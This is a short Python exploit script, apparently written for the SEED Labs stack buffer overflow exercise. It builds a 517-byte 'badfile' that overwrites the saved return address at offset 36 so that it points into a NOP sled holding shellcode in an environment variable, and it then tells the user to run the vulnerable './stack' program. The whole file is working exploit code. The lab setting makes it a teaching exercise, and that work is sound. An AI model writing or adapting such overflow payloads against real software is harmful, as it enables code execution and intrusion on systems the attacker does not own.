#!/usr/bin/env python3
import struct

# Try multiple addresses - jump to different points in the NOP sled
env_base = 0xffffcfeb

# Jump well into the 200-byte NOP sled (try offset 100)
env_shellcode_addr = env_base + 100

offset = 36
payload = b'A' * offset
payload += struct.pack("<I", env_shellcode_addr)
payload += b'B' * (517 - len(payload))

print(f"[+] Jumping to: {hex(env_shellcode_addr)}")

with open('../vulnerable-programs/seedlabs-stack/badfile', 'wb') as f:
    f.write(payload)

print("[+] Run: ./stack")
